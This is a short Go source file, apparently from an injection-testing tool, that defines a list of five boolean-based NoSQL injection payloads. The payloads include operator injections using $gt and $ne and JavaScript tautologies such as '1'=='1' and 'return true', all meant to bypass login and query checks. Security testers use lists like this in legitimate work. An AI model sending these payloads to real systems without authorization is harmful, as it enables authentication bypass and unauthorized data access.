package payloads

var NoSQL = PayloadGroup{
	DBMS: "NoSQL",
	Payloads: []Payload{
		{Type: "boolean", Content: "{\" $gt \": \"\"}"},
		{Type: "boolean", Content: "{\" $ne \": null}"},
		{Type: "boolean", Content: "admin' || '1'=='1"},
		{Type: "boolean", Content: "'; return true; //"},
		{Type: "boolean", Content: "\"} || 1==1 //"},
	},
}
